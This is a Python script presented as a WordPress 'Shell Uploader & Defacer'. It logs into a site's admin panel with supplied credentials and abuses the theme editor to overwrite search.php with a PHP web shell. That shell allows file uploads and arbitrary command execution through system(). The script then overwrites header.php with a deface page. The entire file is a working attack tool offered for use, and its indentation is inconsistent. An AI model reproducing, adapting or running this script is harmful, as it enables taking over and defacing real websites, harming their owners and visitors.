#coded by a 15 years old script kiddie :p
#Learn to code, not to copy :)
#Video Demo: https://youtu.be/KYtFpwV0x3w
#https://github.com/skidiekhan/wp-sud
#Salam to all muslim brothers :)

import requests, re
print("==============================")
print("[+] WP~SUD v.10")
print("[+] Shell Uploader & Defacer")
print("[~] Coded by Skidie khan")
print("[+] github.com/skidiekhan/ ")
print("[+] === [+] === [+] === [+]")
print("Greetz to: Xploiter~X3D, CyberCat , Sharp_mind & all muslim hackers")
print("=============[+]==============")
print("Love to ~ Tiger M@te")
print("==============================")
with requests.session() as c:
  url=raw_input('[+]Put site url with http:// (i.e: http://www.site.com)\n>>> ')
  url2 = url + '/wp-login.php'
  admin = url + '/wp-admin/'
  username = raw_input('[+]Put username: ')
  password = raw_input('[+]Put password: ')
  filename = raw_input('[+]put deface page name: ')
  defopen = open(filename, 'r')
  defcode_1 = defopen.read()
  defcode = defcode_1.replace("\"","'")
  headers = {'Referer':url, 'User-Agent':'Mozilla/5.0'}
  p=c.get(url2, headers = headers)
  code=str(p.status_code)
  v= '200'
  if code == v:
    print ('===> URL is OK. Trying to Log In....')
    login_data={'log':username, 'pwd':password, 'wp-submit':'Log+In','redirect_to':admin, 'testcookie':'1'}
    c.post(url2, data=login_data,headers=headers)
    test=c.get(admin,headers=headers)
    code2=str(test.status_code)
    if code2 == v:
      print('===> login Success! Uploading Shell....')
      editor=admin + 'theme-editor.php?file=search.php#template'
      edit=admin + 'theme-editor.php'
      req=c.get(editor, headers=headers)
      source=req.content
      n=re.findall('<option value="(.*?)" selected="selected">',source)
      for i in n:
	name=i
      nonce=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source)
      for a in nonce:
	wpnonce=a
      shellcode = """<?php
$files = @$_FILES['files'];
if ($files['name'] != '') {
$fullpath = $_REQUEST['path'] . $files['name'];
if (move_uploaded_file($files['tmp_name'], $fullpath)) {
echo \"<h1><a href='$fullpath'>OK-Click here!</a></h1>\";
}
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype=multipart/form-data action=><input type=text name=path><input type=file name=files><input type=submit value=Up></form></body></html>';
?><?php $cmd = <<<EOD
cmd
EOD;
if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>"""
      form_data = {"_wpnonce":wpnonce, "_wp_http_referer":"/wp-admin/theme-editor.php?file=search.php", "newcontent":shellcode, "action":"update", "file":"search.php", "theme":name, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
      c.post(edit, data=form_data, headers=headers)
      shell=url + "/wp-content/themes/" + name + "/search.php"
      ss=c.get(shell, headers=headers).content
      title="<title>Upload files...</title>"
      if title in ss:
	      print("===> Shell Uploaded Successfully! :D")
	      print("===> " + shell) 
	      print('===> Uploading deface page...')
	      editor2=admin + 'theme-editor.php?file=header.php#template'
        req2=c.get(editor2, headers=headers)
        source2=req2.content
        nonce2=re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"',source2)
        for b in nonce2:
	      wpnonce2=b
	      defc="<?php die(\"" + defcode + "\"); ?>"
	      form_data2 = {"_wpnonce":wpnonce2, "_wp_http_referer":"/wp-admin/theme-editor.php?file=header.php", "newcontent":defc, "action":"update", "file":"header.php", "theme":name, "scrollto":"0", "docs-list":"", "submit":"Update+File"}
	      c.post(edit, data=form_data2, headers=headers)
	      print('===> Successfully Defaced Homepage!!!')
      else:
	      print("===> Shell Upload Failed :(")
	      print("===> upload deface failed :(")
    else:
      print('===> Login Failed! Maybe Your password is incorrect!')
  else:
    print ('===> Couldn\'t get '+ url2 +'\nEnd. Please restart the program & put valid url')
